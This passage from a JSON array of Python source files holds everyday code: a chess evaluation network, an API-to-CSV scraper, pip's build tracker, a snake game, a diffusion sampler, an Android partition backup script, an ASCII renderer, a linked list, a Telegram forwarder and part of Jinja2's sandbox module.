= [next(g) for k, g in groupby(joblist, key=lambda x: (x['title'], x['company']))]\n    return joblist\n\ndef convert_date_format(date_string):\n    \"\"\"\n    Converts a date string to a date object. \n    \n    Args:\n        date_string (str): The date in string format.\n\n    Returns:\n        date: The converted",
    "import chess\r\nimport chess.pgn\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nimport torch.optim as optim\r\nfrom torch.utils.data import Dataset, DataLoader\r\n\r\n# neural network architecture\r\nclass Net(nn.Module):\r\n  def __init__(self):\r\n    super(Net, self).__init__()\r\n    self.conv1 = nn.Conv2d(12, 16, kernel_size=3, padding=1)\r\n    self.conv2 = nn.Conv2d(16, 32, kernel_size=3, padding=1)\r\n    self.conv3 = nn.Conv2d(32, 64, kernel_size=3, padding=1)\r\n    self.fc1 = nn.Linear(64 * 2 * 2, 256)\r\n    self.fc2 = nn.Linear(256, 1)\r\n\r\n  def forward(self, x):\r\n    x = F.relu(self.conv1(x))\r\n    x = F.max_pool2d(x, 2)\r\n    x = F.relu(self.conv2(x))\r\n    x = F.max_pool2d(x, 2)\r\n    x = F.relu(self.conv3(x))\r\n    x = x.view(-1, 64 * 2 * 2)\r\n    x = F.relu(self.fc1(x))\r\n    x = self.fc2(x)\r\n    return torch.tanh(x)\r\n\r\n# process games and generate training set\r\nclass Data(Dataset):\r\n  def __init__(self, paths):\r\n    self.positions = []\r\n    self.results = []\r\n    loaded = 0\r\n    for path in paths:\r\n      with open(path) as file:\r\n        while True:\r\n          game = chess.pgn.read_game(file)\r\n          if game is None:\r\n            break\r\n          result = game.headers['Result']\r\n          if result not in ['1-0', '0-1', '1/2-1/2']:\r\n            continue\r\n          board = game.board()\r\n          for move in game.mainline_moves():\r\n            board.push(move)\r\n            self.positions.append(convert(board))\r\n            self.results.append(self.numeric(result))\r\n          loaded += 1\r\n          if loaded % 1000 == 0:\r\n            print(f'loaded: {loaded}')\r\n  \r\n  def numeric(self, result):\r\n    if result == '1-0':\r\n      return 1\r\n    elif result == '0-1':\r\n      return -1\r\n    else:\r\n      return 0\r\n\r\n  def __len__(self):\r\n    return len(self.positions)\r\n\r\n  def __getitem__(self, idx):\r\n    return self.positions[idx], self.results[idx]\r\n\r\n# convert positions to numerical format\r\ndef convert(board):\r\n  bt = np.zeros((12, 8, 8), dtype=np.float32)\r\n  pm = {chess.PAWN: 0, chess.KNIGHT: 1, chess.BISHOP: 2, chess.ROOK: 3, chess.QUEEN: 4, chess.KING: 5}\r\n  for square in chess.SQUARES:\r\n    piece = board.piece_at(square)\r\n    if piece is not None:\r\n      row, col = divmod(square, 8)\r\n      index = pm[piece.piece_type]\r\n      bt[index + (6 if piece.color != chess.WHITE else 0), row, col] = 1\r\n  return bt\r\n\r\n# load dataset and prepare dataloader\r\ndef retrieve(paths, batch_size=64):\r\n  dataset = Data(paths)\r\n  return DataLoader(dataset, batch_size=batch_size, shuffle=True)\r\n\r\n# train model\r\ndef train(paths, epochs=3, batch_size=64, lr=0.001, pretrained=None):\r\n  dataloader = retrieve(paths, batch_size=batch_size)\r\n  device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\r\n  model = Net().to(device)\r\n  if pretrained:\r\n    model.load_state_dict(torch.load(pretrained, map_location=device))\r\n  criterion = nn.MSELoss()\r\n  optimizer = optim.Adam(model.parameters(), lr=lr)\r\n  model.train()\r\n  lowest = float('inf')\r\n  for epoch in range(epochs):\r\n    rl = 0.0\r\n    for i, data in enumerate(dataloader, 0):\r\n      inputs, labels = data\r\n      inputs, labels = inputs.to(device), labels.to(device)\r\n      optimizer.zero_grad()\r\n      outputs = model(inputs)\r\n      loss = criterion(outputs.squeeze(), labels.float())\r\n      loss.backward()\r\n      optimizer.step()\r\n      rl += loss.item()\r\n      if i % 100 == 99:\r\n        average = rl / 100\r\n        print(f'epoch: {epoch + 1}, it: {i + 1}, loss: {rl / 100:.3f}')\r\n        if average < lowest:\r\n          lowest = average\r\n          save = 'model.pth' if pretrained is None else 'updated.pth'\r\n          torch.save(model.state_dict(), save)\r\n          print(f'saved: {lowest:.3f}')\r\n        rl = 0.0\r\n\r\nif __name__ == '__main__':\r\n  paths = ['dataset.pgn']\r\n  train(paths)\r\n  # uncomment to train using pretrained model\r\n  # train(paths, pretrained='model.pth')\r\n",
    "import requests\nimport pandas as pd\n\n\ndef get_data_character_api():\n    url = 'https://swapi.dev/api/people/'\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        data = response.json()\n        characters = []\n        for result in data['results']:\n            character = {\n                \"name\": result[\"name\"],\n                \"height\": int(result[\"height\"]),\n                \"mass\": int(result[\"mass\"])\n            }\n            characters.append(character)\n        return characters\n    else:\n        print(\"Failed Connection. Status Code:\", response.status_code)\n        return None\n\n\ndef create_dataframe(dados):\n    return pd.DataFrame(dados)\n\n\ndef order_characters(df, sort_column='height'):\n    return df.sort_values(by=[sort_column], ascending=False)\n\n\ndef create_csv(data, filename):\n    try:\n        df = pd.DataFrame(data)\n        df.to_csv(filename, index=False)\n        print(f'File {filename} created successfully.')\n    except Exception as err:\n        print(f'Error creating CSV file {filename}:', err)\n\n\ndef main():\n    try:\n        data = get_data_character_api()\n        df = create_dataframe(data)\n        ordered_characters = order_characters(df)\n        create_csv(ordered_characters, \"star_wars_characters.csv\")\n    except Exception as err:\n        print(\"There was an error with Star Wars API. Please try again!\", err)\n\n\nmain()\n",
    "import contextlib\nimport hashlib\nimport logging\nimport os\nfrom types import TracebackType\nfrom typing import Dict, Iterator, Optional, Set, Type, Union\n\nfrom pip._internal.models.link import Link\nfrom pip._internal.req.req_install import InstallRequirement\nfrom pip._internal.utils.temp_dir import TempDirectory\n\nlogger = logging.getLogger(__name__)\n\n\n@contextlib.contextmanager\ndef update_env_context_manager(**changes: str) -> Iterator[None]:\n    target = os.environ\n\n    # Save values from the target and change them.\n    non_existent_marker = object()\n    saved_values: Dict[str, Union[object, str]] = {}\n    for name, new_value in changes.items():\n        try:\n            saved_values[name] = target[name]\n        except KeyError:\n            saved_values[name] = non_existent_marker\n        target[name] = new_value\n\n    try:\n        yield\n    finally:\n        # Restore original values in the target.\n        for name, original_value in saved_values.items():\n            if original_value is non_existent_marker:\n                del target[name]\n            else:\n                assert isinstance(original_value, str)  # for mypy\n                target[name] = original_value\n\n\n@contextlib.contextmanager\ndef get_requirement_tracker() -> Iterator[\"RequirementTracker\"]:\n    root = os.environ.get(\"PIP_REQ_TRACKER\")\n    with contextlib.ExitStack() as ctx:\n        if root is None:\n            root = ctx.enter_context(TempDirectory(kind=\"req-tracker\")).path\n            ctx.enter_context(update_env_context_manager(PIP_REQ_TRACKER=root))\n            logger.debug(\"Initialized build tracking at %s\", root)\n\n        with RequirementTracker(root) as tracker:\n            yield tracker\n\n\nclass RequirementTracker:\n    def __init__(self, root: str) -> None:\n        self._root = root\n        self._entries: Set[InstallRequirement] = set()\n        logger.debug(\"Created build tracker: %s\", self._root)\n\n    def __enter__(self) -> \"RequirementTracker\":\n        logger.debug(\"Entered build tracker: %s\", self._root)\n        return self\n\n    def __exit__(\n        self,\n        exc_type: Optional[Type[BaseException]],\n        exc_val: Optional[BaseException],\n        exc_tb: Optional[TracebackType],\n    ) -> None:\n        self.cleanup()\n\n    def _entry_path(self, link: Link) -> str:\n        hashed = hashlib.sha224(link.url_without_fragment.encode()).hexdigest()\n        return os.path.join(self._root, hashed)\n\n    def add(self, req: InstallRequirement) -> None:\n        \"\"\"Add an InstallRequirement to build tracking.\"\"\"\n\n        assert req.link\n        # Get the file to write information about this requirement.\n        entry_path = self._entry_path(req.link)\n\n        # Try reading from the file. If it exists and can be read from, a build\n        # is already in progress, so a LookupError is raised.\n        try:\n            with open(entry_path) as fp:\n                contents = fp.read()\n        except FileNotFoundError:\n            pass\n        else:\n            message = \"{} is already being built: {}\".format(req.link, contents)\n            raise LookupError(message)\n\n        # If we're here, req should really not be building already.\n        assert req not in self._entries\n\n        # Start tracking this requirement.\n        with open(entry_path, \"w\", encoding=\"utf-8\") as fp:\n            fp.write(str(req))\n        self._entries.add(req)\n\n        logger.debug(\"Added %s to build tracker %r\", req, self._root)\n\n    def remove(self, req: InstallRequirement) -> None:\n        \"\"\"Remove an InstallRequirement from build tracking.\"\"\"\n\n        assert req.link\n        # Delete the created file and the corresponding entries.\n        os.unlink(self._entry_path(req.link))\n        self._entries.remove(req)\n\n        logger.debug(\"Removed %s from build tracker %r\", req, self._root)\n\n    def cleanup(self) -> None:\n        for req in set(self._entries):\n            self.remove(req)\n\n        logger.debug(\"Removed build tracker: %r\", self._root)\n\n    @contextlib.contextmanager\n    def track(self, req: InstallRequirement) -> Iterator[None]:\n        self.add(req)\n        yield\n        self.remove(req)\n",
    "import turtle, random, time\n\nSTEP = 20\nTIMEOUT = 0.5\nWIDTH = 800\nHEIGHT = 600\n\ndef go_up():\n    head.setheading(90)\n    \ndef go_down():\n    head.setheading(270)\n    \ndef go_left():\n    head.setheading(180)\n    \ndef go_right():\n    head.setheading(0)\n    \n\nscreen = turtle.Screen()\nscreen.title('\u0417\u043c\u0435\u0435\u043d\u044b\u0448')\nscreen.bgcolor('lightgreen')\nscreen.setup(WIDTH, HEIGHT)\n\nscreen.listen()\nscreen.onkeypress(go_up, \"Up\")\nscreen.onkeypress(go_down, \"Down\")\nscreen.onkeypress(go_left, \"Left\")\nscreen.onkeypress(go_right, \"Right\")\n\nhead = turtle.Turtle()\nhead.penup()\nhead.shape('square')\nhead.color(\"blue\")\n\nsnail = []\nsnail.append(head)\n\nfood = turtle.Turtle()\nfood.speed(0)\nfood.shape(\"circle\")\nfood.penup()\nfood.color(\"purple\")\nx = STEP * random.randint(-WIDTH//(2*STEP), WIDTH//(2*STEP))\ny = STEP * random.randint(-HEIGHT//(2*STEP), HEIGHT//(2*STEP))\nfood.goto(x, y)\n\nwhile True:\n    if head.distance(food) < 2:\n        segment = turtle.Turtle()\n        segment.speed(0)\n        segment.shape(\"square\")\n        segment.penup()\n        segment.color(\"blue\")\n        for element in snail:\n            x, y = element.position()\n            x = x//1\n            y = y//1\n        to = head.heading()\n        to = to//1\n        if to == 0:\n            x-=STEP\n        elif to == 90:\n            y-=STEP\n        elif to == 180:\n            x+=STEP\n        else:\n            y+=STEP\n        segment.goto(x, y)\n        segment.setheading(to)\n        \n        snail.append(segment)\n        x = STEP * random.randint(-WIDTH//(2*STEP), WIDTH//(2*STEP))\n        y = STEP * random.randint(-HEIGHT//(2*STEP), HEIGHT//(2*STEP))\n        food.goto(x, y)\n    to = head.heading()\n    to = to//1\n    if to == 0:\n        fx = x - STEP\n        fy = y\n    elif to == 90:\n        fy = y - STEP\n        fx = x\n    elif to == 180:\n        fx = x + STEP\n        fy = y\n    else:\n        fy = y + STEP\n        fx = x\n    for element in snail:\n        lx, ly = element.position()\n        lx = lx // 1\n        ly = ly//1\n        element.goto(fx, fy)\n        fx, fy = lx, ly\n    time.sleep(TIMEOUT)\n    \n    for i in range(len(snail)-1, 0, -1):\n        x, y = snail[i-1].xcor(), snail[i-1].ycor()\n        snail[i].goto(x,y)\n    \nturtle.exitonclick()\n",
    "import torch\nimport tqdm\nimport k_diffusion.sampling\nfrom modules import sd_samplers_common, sd_samplers_kdiffusion, sd_samplers\nfrom tqdm.auto import trange, tqdm\nfrom k_diffusion import utils\nimport math\n\n\nNAME = 'Euler_Max'\nALIAS = 'euler_max'\n\n\n@torch.no_grad()\ndef sample_euler_max(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0.,\n                   s_tmax=float('inf'), s_noise=1.):\n    extra_args = {} if extra_args is None else extra_args\n    s_in = x.new_ones([x.shape[0]])\n    for i in trange(len(sigmas) - 1, disable=disable):\n        gamma = max(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0.\n        eps = torch.randn_like(x) * s_noise\n        sigma_hat = sigmas[i] * (gamma + 1)\n        if gamma > 0:\n            x = x - eps * (sigma_hat ** 2 - sigmas[i] ** 2) ** 0.5\n        denoised = model(x, sigma_hat * s_in, **extra_args)\n        d = k_diffusion.sampling.to_d(x, sigma_hat, denoised)\n        if callback is not None:\n            callback({'x': x, 'i': i, 'sigma': sigmas[i], 'sigma_hat': sigma_hat, 'denoised': denoised})\n        dt = sigmas[i + 1] - sigma_hat\n        # Euler method\n        x = x + (math.cos(i + 1)/(i + 1) + 1) * d * dt\n    return x\n\n\nif not NAME in [x.name for x in sd_samplers.all_samplers]:\n    euler_max_samplers = [(NAME, sample_euler_max, [ALIAS], {})]\n    samplers_data_euler_max_samplers = [\n        sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: sd_samplers_kdiffusion.KDiffusionSampler(funcname, model), aliases, options)\n        for label, funcname, aliases, options in euler_max_samplers\n        if callable(funcname) or hasattr(k_diffusion.sampling, funcname)\n    ]\n    sd_samplers.all_samplers += samplers_data_euler_max_samplers\n    sd_samplers.all_samplers_map = {x.name: x for x in sd_samplers.all_samplers}\n",
    "import subprocess\r\n\r\n#Developer github\r\ngithub_username = \"Sathya-github-del\"\r\n\r\ndef create_adb_instance():\r\n    return subprocess.Popen(['adb', 'shell'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n\r\ndef get_connected_device():\r\n    devices_output = subprocess.check_output(['adb', 'devices']).decode().split('\\n')\r\n    for device in devices_output[1:]:\r\n        if device.strip():\r\n            return device.split('\\t')[0]\r\n    return None\r\n\r\ndef backup_partition(device_id, partition_name, output_file, partition_number):\r\n    if device_id:\r\n        subprocess.call(['adb', '-s', device_id, 'shell', 'su', '-c', 'dd', 'if=' + partition_name, 'of=' + output_file])\r\n        print(f\"{partition_number}. Backup of {partition_name} saved to {output_file}\")\r\n    else:\r\n        print(\"No device connected.\")\r\n\r\ndef backup_cache_partition(device_id):\r\n    cache_partition = get_cache_partition_path(device_id)\r\n    if cache_partition:\r\n        # Backup cache partition\r\n        backup_cache = input(\"Do you want to backup cache partition? (y/n): \")\r\n        if backup_cache.lower() == 'y':\r\n            backup_partition(device_id, cache_partition, '/sdcard/cache.img', \"4\")\r\n        print(\"Cache partition backed up successfully.\")\r\n    else:\r\n        print(\"Cache partition not found.\")\r\n\r\ndef get_cache_partition_path(device_id):\r\n    if device_id:\r\n        # Execute 'ls -al /dev/block/by-name' command to fetch cache partition path\r\n        output = subprocess.check_output(['adb', '-s', device_id, 'shell', 'ls', '-al', '/dev/block/by-name']).decode()\r\n        lines = output.split('\\n')\r\n        cache_partition = None\r\n        for line in lines:\r\n            if 'cache' in line:\r\n                cache_partition = line.split()[-1]\r\n        return cache_partition\r\n    else:\r\n        return None\r\n\r\ndef backup_boot_recovery_img(device_id):\r\n    boot_partition, recovery_partition = get_partition_paths(device_id)\r\n    if boot_partition and recovery_partition:\r\n        # Backup boot.img\r\n        backup_boot = input(\"Do you want to backup boot partition? (y/n): \")\r\n        if backup_boot.lower() == 'y':\r\n            backup_partition(device_id, boot_partition, '/sdcard/boot.img', \"1\")\r\n        \r\n        # Backup recovery.img\r\n        backup_recovery = input(\"Do you want to backup recovery partition? (y/n): \")\r\n        if backup_recovery.lower() == 'y':\r\n            backup_partition(device_id, recovery_partition, '/sdcard/recovery.img', \"2\")\r\n\r\n        # Backup cache.img\r\n        backup_cache_partition(device_id)\r\n\r\n        # Find super.img partition\r\n        super_partition_path = find_super_partition(device_id)\r\n\r\n        # Backup super.img\r\n        backup_super = input(\"Do you want to backup super partition? (y/n): \")\r\n        if backup_super.lower() == 'y' and super_partition_path:\r\n            backup_partition(device_id, super_partition_path, '/sdcard/super.img', \"3\")\r\n\r\n        print(\"Images backed up successfully.\")\r\n    else:\r\n        print(\"Failed to fetch partition paths.\")  \r\n\r\ndef get_partition_paths(device_id):\r\n    if device_id:\r\n        # Execute 'ls -al /dev/block/by-name' command to fetch partition paths\r\n        output = subprocess.check_output(['adb', '-s', device_id, 'shell', 'ls', '-al', '/dev/block/by-name']).decode()\r\n        lines = output.split('\\n')\r\n        boot_partition = None\r\n        recovery_partition = None\r\n        for line in lines:\r\n            if 'boot' in line:\r\n                boot_partition = line.split()[-1]\r\n            elif 'recovery' in line:\r\n                recovery_partition = line.split()[-1]\r\n        return boot_partition, recovery_partition\r\n    else:\r\n        return None, None\r\n\r\ndef find_super_partition(device_id):\r\n    if device_id:\r\n        # Execute 'ls -al /dev/block/by-name' command to find super partition\r\n        output = subprocess.check_output(['adb', '-s', device_id, 'shell', 'ls', '-al', '/dev/block/by-name']).decode()\r\n        lines = output.split('\\n')\r\n        super_partition = None\r\n        for line in lines:\r\n            if 'super' in line:\r\n                super_partition = line.split()[-1]\r\n                break\r\n        return super_partition\r\n    else:\r\n        return None\r\n\r\n\r\ndef print_github_username():\r\n    print(f\"This project was made by {github_username}\")\r\n\r\n\r\ndevice_id = get_connected_device()\r\n\r\nif device_id:\r\n    backup_boot_recovery_img(device_id)\r\n    print_github_username()  \r\nelse:\r\n    print(\"No device connected.\")\r\n\r\n",
    "import math\r\nimport time\r\nimport os\r\n\r\n# The following variables can be modified to get different results. Code might break if you do though lmao\r\nCAMERA = (0, 0, 0)\r\nDISTANCE = 50\r\nRESOLUTION = (50, 50)\r\nPIXEL = (\"@\", \"w\", \"*\", \"-\", \".\")\r\n\r\nX_EDGE = (int((RESOLUTION[0] - (RESOLUTION[0]/2)) * -1), int(RESOLUTION[0] - (RESOLUTION[0]/2)))\r\nY_EDGE = (int((RESOLUTION[1] - (RESOLUTION[1]/2)) * -1), int(RESOLUTION[1] - (RESOLUTION[1]/2)))\r\n\r\ndef pointInFrame(point): # Takes a point in the 3D space, and places it on a 2D grid based on distance from camera.\r\n    updatedPoint = [0,0,0]\r\n    if point[2] >= DISTANCE:\r\n        for i in range(2):\r\n            if point[i] != 0 and point[2] != 0:\r\n                updatedPoint[i] = DISTANCE / (point[2] / point[i])\r\n            else:\r\n                updatedPoint[i] = 0\r\n        updatedPoint[2] = point[2]\r\n    return updatedPoint\r\n\r\ndef isInFrame(points): # Not in use at the moment, but could come in handy later on\r\n    x, y = round(pointInFrame(points)[0]), round(pointInFrame(points)[1])\r\n    return X_EDGE[0] <= x <= X_EDGE[1] and Y_EDGE[0] <= y <= Y_EDGE[1]\r\n\r\ndef pointListToFrame(points): # Applies pointInFrame() to all points in a list\r\n    newPoints = []\r\n    for point in points:\r\n        newPoints.append(pointInFrame(point))\r\n    return newPoints\r\n\r\n# The next three functions may or may not be in use. Still might come in handy x)\r\n\r\ndef findHighestInList(list):\r\n    max = 0\r\n    ind = 0\r\n    for i in range(len(list)):\r\n        if abs(list[i]) > max:\r\n            max = list[i]\r\n            ind = i\r\n    return ind\r\n\r\ndef returnHighest(a,b):\r\n    return a if a >= b else b\r\n\r\ndef returnLowest(a,b):\r\n    return a if a <= b else b\r\n\r\ndef convertGridToRender(points):     # Converts points on the initial grid to renderable points.\r\n    newPoints = []                   # Renderable points start at 0 and increase from there.\r\n    for point in range(len(points)):\r\n        newPoints.append([0,0,0])\r\n        newPoints[point][0] = points[point][0] + (RESOLUTION[0] / 2)\r\n        newPoints[point][1] = points[point][1] + (RESOLUTION[1] / 2)\r\n        newPoints[point][2] = points[point][2]\r\n    for point in newPoints:\r\n        for i in point:\r\n            i = int(i)\r\n    return newPoints\r\n\r\ndef pointListToInt(points): # Rounds all numbers in a pointlist to intergers\r\n    newPoints = []\r\n    for i in points:\r\n        newPoints.append([round(i[0]),round(i[1]),round(i[2])])\r\n    return newPoints\r\n\r\ndef removeZFromSinglePoint(point): # [x, y, z] -> [x, y]\r\n    newPoint = [point[0], point[1]]\r\n    return newPoint\r\n\r\ndef removeZFromPoints(points): # [[x, y, z], [a, b, c]] -> [[x, y], [a, b]]\r\n    newPoints = []\r\n    for i in points:\r\n        newPoints.append([i[0], i[1]])\r\n    return newPoints\r\n\r\ndef sortByZ(points): # Takes a list of points and sorts them by their Z coordinates (index 2)\r\n    arr = points     # I wanted this list to return largest to smallest, but that didn't work with the renderer, and now for some reason the opposite is working.\r\n    n = len(arr)     # If it ain't broke, don't fix it.\r\n    for i in range(n):\r\n        for j in range(0, n-i-1):\r\n            if arr[j][2] > arr[j+1][2]:\r\n                arr[j], arr[j+1] = arr[j+1], arr[j]\r\n    return arr\r\n\r\n# This function takes a list of points where all numbers are already converted to INTEGERS on a 2d grid \r\ndef renderFrame(points):\r\n    finalString = \"\"\r\n    for y in range(RESOLUTION[1]):      # Turns everything upside down btw\r\n        for x in range(RESOLUTION[0]):\r\n            saveindex = []\r\n            for i in points:\r\n                if [round(x),round(y)] == removeZFromSinglePoint(i):\r\n                    distanceRating = ((i[2]-DISTANCE if 0 < i[2]-DISTANCE <= 40 else 40) / 10) if i[2] - DISTANCE != 0 else 0\r\n                    finalString += PIXEL[round(distanceRating)] * 2\r\n                    saveindex = [x,y]\r\n                    break\r\n            if [x,y] == saveindex:\r\n                continue\r\n            finalString += \"  \"\r\n        finalString += \"\\n\"\r\n    return finalString\r\n\r\ndef AddOrSubtract(x,y,bool): # (x + y) if bool==True else (x - y). Saves space in drawLine() function.\r\n    if bool == True:\r\n        return x + y\r\n    else:\r\n        return x - y\r\n\r\ndef drawLine(a, b): # Takes two points and draws enough points to make a \"line\" in the final render. This function should work before and \r\n    line = []\r\n    differences = []\r\n    axSmaller = a[0] < b[0]\r\n    aySmaller = a[1] < b[1]\r\n    azSmaller = a[2] < b[2]\r\n    for i in range(3):\r\n        differences.append(abs(a[i] - b[i]))\r\n    highestDifference = returnHighest(RESOLUTION[0], RESOLUTION[1])\r\n    for i in range(highestDifference):\r\n        line.append([AddOrSubtract(a[0], round((differences[0]/highestDifference)*i), axSmaller), AddOrSubtract(a[1], round((differences[1]/highestDifference)*i), aySmaller), AddOrSubtract(a[2], round((differences[2]/highestDifference)*i), azSmaller)])\r\n    return line\r\n\r\n# I have never used sin or cos before i star",
    "class Node:\r\n    #Initialize a node with the given data.\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.ref = None\r\n\r\nclass LinkedList :\r\n    #Initialize an empty linked list.\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    #Print the elements of the linked list in order.\r\n    def print_LL(self):\r\n        if self.head is None:\r\n            print(\"LL is empty\")\r\n        else:\r\n            n =self.head\r\n            while n is not None:\r\n                print(n.data, \"--->\" , end=\" \")\r\n                n = n.ref\r\n\r\n    #Insert a node to the beginning of the linked list.\r\n    def add_begin(self, data):\r\n        new_node = Node(data)\r\n        new_node.ref = self.head\r\n        self.head = new_node\r\n\r\n    #Delete a node to the beginning of the linked list.\r\n    def delete_begin(self):\r\n        if self.head is None:\r\n            print(\"LL is empty i cant delete this node\")\r\n        else:\r\n            self.head = self.head.ref\r\n\r\n     #delete a node to the end of the linked list.\r\n    def delete_end(self):\r\n        if self.head is None:\r\n            print(\"LL is empty i cant delete this node\")\r\n        elif self.head.ref is None:\r\n            self.head = None\r\n        else:\r\n            n =self.head\r\n            while n.ref.ref is not None:\r\n                n = n.ref\r\n            n.ref = None\r\n\r\n    #delete a node to the middle / by value of the linked list.  \r\n    def delete_by_value(self,x):\r\n        if self.head is None:\r\n            print(\"LL is empty i cant delete this node\")\r\n            return\r\n        if x== self.head.data :\r\n            self.head = self.head.ref\r\n            return\r\n        n = self.head\r\n        while n.ref is not None:\r\n            if x==n.ref.data :\r\n                break\r\n            n = n.ref\r\n        if n.ref is None:\r\n            print(\"node is not Found in LL\")\r\n        else:\r\n            n.ref = n.ref.ref\r\n\r\n#Call the function\r\n#run the functions separately with commenting other below functions         \r\nLL1 = LinkedList()\r\nLL1.add_begin(30)\r\nLL1.add_begin(40)\r\nLL1.add_begin(50)\r\n#LL1.delete_begin()\r\n#LL1.delete_end()\r\nLL1.delete_by_value(30)\r\nLL1.print_LL()\r\n",
    "import re\nimport logging\nimport json \nfrom typing import List\nfrom pyrogram import Client, filters\nfrom pyrogram.handlers import MessageHandler\nfrom pyrogram.types import Message\nfrom config import conf, ChannelConfig\n\nlogger = logging.getLogger(\"tggt\")\nlogger.setLevel(conf.logging_level)\nfh = logging.FileHandler(\"logs/app.log\")\nlogger.addHandler(fh)\n\ndef forward_content(source_channel_ids: List[int], channels: List[ChannelConfig]):\n    \"\"\"\n        \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u0435\u0442 \u043d\u043e\u0432\u044b\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u0438\u0437 \u043a\u0430\u043d\u0430\u043b\u043e\u0432 source_channel_ids\n        \u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u0442 \u0438\u0445 \u0432 channels, \u0435\u0441\u043b\u0438 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u0440\u0435\u0433\u0443\u043b\u044f\u0440\u043a\u0430\n    \"\"\"\n\n    client = Client(name='app_client', api_id=conf.api_id, api_hash=conf.api_hash)\n        \n    def forward_message(client: Client, message: Message):\n        \"\"\"\n            \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u0432 \u0441\u0432\u043e\u0438 \u043a\u0430\u043d\u0430\u043b\u044b\n        \"\"\"\n\n        print('new message: \"', message.text, '\"')\n        logger.info('new message')\n        logger.info(str(message))\n        message_to_check = message.text or message.caption\n        if not message_to_check:\n            return\n        \n        for channel in channels:            \n            if re.search(channel.regex, message_to_check):\n                logger.info('found match, sending to ' + str(channel.channel_id))\n                print('found match, sending to ' + str(channel.channel_id))\n                message.forward(chat_id=channel.channel_id)\n                if message.link:\n                    client.send_message(chat_id=channel.channel_id, text=message.link)\n            else:\n                logger.info('message', message_to_check, 'doesnt match with ', channel.regex)\n\n    def filter_channels(self, client, message: Message):\n        \"\"\"\n            \u0424\u0438\u043b\u044c\u0442\u0440 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439. \u041e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u044e\u0442\u0441\u044f \u0442\u043e\u043b\u044c\u043a\u043e \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f, \u043f\u0440\u0438 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0432\u044b\u0434\u0430\u0435\u0442 True\n        \"\"\"\n\n        #\u043d\u0435 \u043f\u0435\u0440\u0435\u0441\u044b\u043b\u0430\u0442\u044c \u0441\u043e\u0431\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f\n        if conf.block_outgoing:\n            if message.outgoing:\n                return False\n        # \u041f\u043e\u043a\u0430 \u043f\u0435\u0440\u0435\u0441\u044b\u043b\u0430\u0442\u044c \u0432\u0441\u0451 \u0438\u0437 \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u0443\u044e\u0449\u0438\u0445 \u043a\u0430\u043d\u0430\u043b\u043e\u0432\n        return message.chat.id in source_channel_ids\n\n    filter_data = filters.create(filter_channels)\n    client.add_handler(MessageHandler(forward_message, filter_data))\n\n    client.run()\n    \nif __name__ == '__main__':\n    forward_content(conf.sources_ids, conf.channels)\n\n",
    "\"\"\"A sandbox layer that ensures unsafe operations cannot be performed.\nUseful when the template itself comes from an untrusted source.\n\"\"\"\nimport operator\nimport types\nimport typing as t\nfrom _string import formatter_field_name_split  # type: ignore\nfrom collections import abc\nfrom collections import deque\nfrom string import Formatter\n\nfrom markupsafe import EscapeFormatter\nfrom markupsafe import Markup\n\nfrom .environment import Environment\nfrom .exceptions import SecurityError\nfrom .runtime import Context\nfrom .runtime import Undefined\n\nF = t.TypeVar(\"F\", bound=t.Callable[..., t.Any])\n\n#: maximum number of items a range may produce\nMAX_RANGE = 100000\n\n#: Unsafe function attributes.\nUNSAFE_FUNCTION_ATTRIBUTES: t.Set[str] = set()\n\n#: Unsafe method attributes. Function attributes are unsafe for methods too.\nUNSAFE_METHOD_ATTRIBUTES: t.Set[str] = set()\n\n#: unsafe generator attributes.\nUNSAFE_GENERATOR_ATTRIBUTES = {\"gi_frame\", \"gi_code\"}\n\n#: unsafe attributes on coroutines\nUNSAFE_COROUTINE_ATTRIBUTES = {\"cr_frame\", \"cr_code\"}\n\n#: unsafe attributes on async generators\nUNSAFE_ASYNC_GENERATOR_ATTRIBUTES = {\"ag_code\", \"ag_frame\"}\n\n_mutable_spec: t.Tuple[t.Tuple[t.Type, t.FrozenSet[str]], ...] = (\n    (\n        abc.MutableSet,\n        frozenset(\n            [\n                \"add\",\n                \"clear\",\n                \"difference_update\",\n                \"discard\",\n                \"pop\",\n                \"remove\",\n                \"symmetric_difference_update\",\n                \"update\",\n            ]\n        ),\n    ),\n    (\n        abc.MutableMapping,\n        frozenset([\"clear\", \"pop\", \"popitem\", \"setdefault\", \"update\"]),\n    ),\n    (\n        abc.MutableSequence,\n        frozenset([\"append\", \"reverse\", \"insert\", \"sort\", \"extend\", \"remove\"]),\n    ),\n    (\n        deque,\n        frozenset(\n            [\n                \"append\",\n                \"appendleft\",\n                \"clear\",\n                \"extend\",\n                \"extendleft\",\n                \"pop\",\n                \"popleft\",\n                \"remove\",\n                \"rotate\",\n            ]\n        ),\n    ),\n)\n\n\ndef inspect_format_method(callable: t.Callable) -> t.Optional[str]:\n    if not isinstance(\n        callable, (types.MethodType, types.BuiltinMethodType)\n    ) or callable.__name__ not in (\"format\", \"format_map\"):\n        return None\n\n    obj = callable.__self__\n\n    if isinstance(obj, str):\n        return obj\n\n    return None\n\n\ndef safe_range(*args: int) -> range:\n    \"\"\"A range that can't generate ranges with a length of more than\n    